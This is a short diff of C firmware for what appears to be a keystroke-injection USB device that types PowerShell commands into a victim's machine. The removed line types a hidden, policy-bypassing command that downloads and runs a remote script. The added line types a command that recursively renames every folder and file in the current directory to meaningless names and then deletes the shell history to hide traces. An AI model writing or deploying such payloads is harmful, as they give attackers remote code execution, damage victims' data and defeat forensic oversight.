@@ -23,7 +23,7 @@ void main(void) {
   
   DLY_ms(200);
 
-  KBD_print("powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command \"iwr https://raw.githubusercontent.com/vjfq/q/refs/heads/main/hi | iex\""
+  KBD_print("powershell -Command \"cd .; function Rename-Directories { param ([string]$path,[ref]$counter) ; $folders = Get-ChildItem -Path $path -Directory -Recurse | Sort-Object FullName -Descending ; foreach ($folder in $folders) { $newFolderName = \"d\" * $counter.Value ; $newFolderPath = $newFolderName ; $counter.Value++ ; Rename-Item -Path $folder.FullName -NewName $newFolderPath } } ; function Rename-Files { param ([string]$path,[ref]$counter) ; $files = Get-ChildItem -Path $path -File -Recurse ; foreach ($file in $files) { $newFileName = \\\"a\\\" + \\\" \\\" * $counter.Value ; $newFilePath = \"$newFileName\" + $file.Extension ; $counter.Value++ ; Rename-Item -Path $file.FullName -NewName $newFilePath } } ; `$counter = 1 ; Rename-Directories -path . -counter ([ref]`$counter) ; `$counter = 1 ; Rename-Files -path . -counter ([ref]`$counter) ; Remove-Item (Get-PSReadlineOption).HistorySavePath ; exit\""
 );
   
   DLY_ms(50);
